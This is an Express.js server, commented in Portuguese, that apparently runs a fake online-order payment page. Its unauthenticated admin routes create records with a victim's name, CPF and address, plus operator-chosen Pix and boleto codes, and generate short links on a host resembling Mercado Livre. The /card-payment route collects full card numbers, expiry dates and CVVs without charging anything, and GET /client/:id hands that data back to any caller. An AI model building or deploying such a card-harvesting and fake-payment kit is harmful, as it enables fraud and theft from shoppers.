const express = require('express');
const { v4: uuidv4 } = require('uuid');
const app = express();
const port = 3000;
const path = require('path');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs').promises; // Usar fs.promises para operações assíncronas

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(cors());

let clients = [];
const clientsFile = 'clients.json';

// Carregar clientes do arquivo ao iniciar
async function loadClients() {
  try {
    if (await fs.access(clientsFile).then(() => true).catch(() => false)) {
      const data = await fs.readFile(clientsFile, 'utf8');
      clients = JSON.parse(data);
      console.log('Clientes carregados do arquivo:', clients);
    } else {
      console.log('Arquivo clients.json não encontrado, inicializando com cliente padrão.');
      clients = [
        {
          id: '1',
          name: 'benan fei',
          cpf: '0099900022',
          address: 'rua do centro axter Entrega no endereco',
          deliveryDate: '2025-12-12',
          paymentMethod: 'boleto',
          total: '98,80',
          productName: 'Parafusadeira E Fureadeira Impacto The Black Tools Td-21wp 21V 3.8V',
          productPhoto: '',
          qrCode: '',
          pixCode: '',
          boletoLine: '83640000001234567890123456789012345678901234567890'
        }
      ];
    }
  } catch (error) {
    console.error('Erro ao carregar clientes do arquivo:', error);
    clients = [
      {
        id: '1',
        name: 'benan fei',
        cpf: '0099900022',
        address: 'rua do centro axter Entrega no endereco',
        deliveryDate: '2025-12-12',
        paymentMethod: 'boleto',
        total: '98,80',
        productName: 'Parafusadeira E Fureadeira Impacto The Black Tools Td-21wp 21V 3.8V',
        productPhoto: '',
        qrCode: '',
        pixCode: '',
        boletoLine: '83640000001234567890123456789012345678901234567890'
      }
    ];
  }
}

let cardData = {};

// Salvar clientes no arquivo após cada modificação
async function saveClients() {
  try {
    await fs.writeFile(clientsFile, JSON.stringify(clients, null, 2), 'utf8');
    console.log('Clientes salvos no arquivo com sucesso.');
  } catch (error) {
    console.error('Erro ao salvar clientes no arquivo:', error);
    throw new Error('Falha ao salvar os dados dos clientes.');
  }
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/clients', (req, res) => {
  console.log('GET /clients chamado. Clientes atuais:', clients);
  res.json(clients);
});

app.get('/client/:id', (req, res) => {
  console.log(`GET /client/${req.params.id} chamado. Clientes disponíveis:`, clients);
  const client = clients.find(c => c.id === req.params.id);
  if (client) {
    const clientWithCard = { ...client, card: cardData[client.id] || null };
    console.log(`Cliente encontrado:`, clientWithCard);
    res.json(clientWithCard);
  } else {
    console.log(`Cliente com ID ${req.params.id} não encontrado.`);
    res.status(404).json({ error: 'Cliente não encontrado' });
  }
});

app.get('/c/:shortId', (req, res) => {
  console.log(`GET /c/${req.params.shortId} chamado. Clientes disponíveis:`, clients);
  const client = clients.find(c => c.shortId === req.params.shortId);
  if (client) {
    console.log(`Redirecionando para /index.html?id=${client.id}`);
    res.redirect(`/index.html?id=${client.id}`);
  } else {
    console.log(`ShortId ${req.params.shortId} não encontrado.`);
    res.status(404).json({ error: 'Link não encontrado' });
  }
});

app.post('/card-payment', (req, res) => {
  const { clientId, cardNumber, cardHolder, expiryDate, cvv } = req.body;
  if (!clientId || !cardNumber || !cardHolder || !expiryDate || !cvv) {
    return res.status(400).json({ error: 'Todos os campos do cartão são obrigatórios' });
  }
  cardData[clientId] = { cardNumber, cardHolder, expiryDate, cvv };
  res.json({ success: true, message: 'Pagamento com cartão registrado com sucesso', clientId });
});

app.post('/client', upload.fields([
  { name: 'productPhoto', maxCount: 1 },
  { name: 'qrCode', maxCount: 1 }
]), async (req, res) => {
  console.log('POST /client chamado, body:', req.body, 'files:', req.files);
  const { name, cpf, address, deliveryDate, paymentMethod, total, productName, pixCode, boletoLine } = req.body;
  console.log('Delivery Date recebido:', deliveryDate);
  const productPhoto = req.files['productPhoto'] ? req.files['productPhoto'][0].buffer.toString('base64') : '';
  const qrCode = req.files['qrCode'] ? req.files['qrCode'][0].buffer.toString('base64') : '';

  // Validação mais rigorosa
  if (!name || !cpf || !address || !deliveryDate || !paymentMethod || !total || !productName || !productPhoto) {
    console.log('Campos obrigatórios ausentes:', { name, cpf, address, deliveryDate, paymentMethod, total, productName, productPhoto });
    return res.status(400).json({ error: 'Todos os campos obrigatórios, incluindo a foto do produto, devem ser preenchidos' });
  }

  if (!['pix', 'boleto', 'cartao'].includes(paymentMethod)) {
    return res.status(400).json({ error: 'Método de pagamento inválido. Use "pix", "boleto" ou "cartao".' });
  }

  const clientData = {
    id: uuidv4(),
    shortId: uuidv4().slice(0, 6), // Gera um hash curto de 6 caracteres
    name,
    cpf,
    address,
    deliveryDate,
    paymentMethod,
    total,
    productName: productName || 'Parafusadeira E Fureadeira Impacto The Black Tools Tb-21wp 21V 3.8V',
    productPhoto,
    qrCode,
    pixCode: pixCode || '',
    boletoLine: paymentMethod === 'boleto' ? (boletoLine || '83640000001234567890123456789012345678901234567890') : ''
  };

  clients.push(clientData);
  try {
    await saveClients();
    console.log('Cliente salvo:', clientData);
    res.json({ success: true, clientId: clientData.id, link: `https://mlteste.onrender.com/c/${clientData.shortId}` });
  } catch (error) {
    console.error('Erro ao salvar cliente:', error);
    res.status(500).json({ error: 'Erro ao salvar cliente no servidor.' });
  }
});

app.delete('/client/:id', async (req, res) => {
  console.log(`DELETE /client/${req.params.id} chamado`);
  const clientIndex = clients.findIndex(c => c.id === req.params.id);
  if (clientIndex !== -1) {
    clients.splice(clientIndex, 1);
    try {
      await saveClients();
      res.json({ success: true, message: 'Cliente apagado com sucesso' });
    } catch (error) {
      console.error('Erro ao apagar cliente:', error);
      res.status(500).json({ error: 'Erro ao apagar cliente no servidor.' });
    }
  } else {
    res.status(404).json({ error: 'Cliente não encontrado' });
  }
});

app.delete('/clients', async (req, res) => {
  console.log('DELETE /clients chamado');
  clients = [];
  try {
    await saveClients();
    res.json({ success: true, message: 'Todos os clientes apagados com sucesso' });
  } catch (error) {
    console.error('Erro ao apagar todos os clientes:', error);
    res.status(500).json({ error: 'Erro ao apagar todos os clientes no servidor.' });
  }
});

// Inicializar o servidor
async function startServer() {
  await loadClients();
  app.listen(port, () => {
    console.log(`Servidor rodando em http://localhost:${port}`);
  });
}

startServer();
